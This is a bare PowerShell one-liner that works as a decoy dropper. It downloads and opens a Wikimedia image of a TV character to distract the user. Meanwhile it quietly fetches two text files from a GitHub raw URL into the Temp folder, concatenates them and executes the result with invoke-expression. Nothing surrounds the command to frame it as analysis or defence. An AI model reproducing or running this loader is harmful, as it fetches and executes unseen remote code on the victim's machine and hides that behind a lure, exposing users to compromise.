C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "invoke-webrequest -uri https://upload.wikimedia.org/wikipedia/tr/2/29/Ezel_Bayraktar.jpeg -outfile 'AppData\Local\Temp\ezel.jpeg'; start 'AppData\Local\Temp\ezel.jpeg'; Invoke-Webrequest -uri https://raw.githubusercontent.com/hmzdgn/0/main/s1.txt -outfile ~\AppData\Local\Temp\s1.txt; Invoke-Webrequest -uri https://raw.githubusercontent.com/hmzdgn/0/main/s2.txt -outfile ~\AppData\Local\Temp\s2.txt; [String]$s1 = cat ~\AppData\Local\Temp\s1.txt; [String]$s2 = cat ~\AppData\Local\Temp\s2.txt; $command = $s1 + $s2; invoke-expression $command"
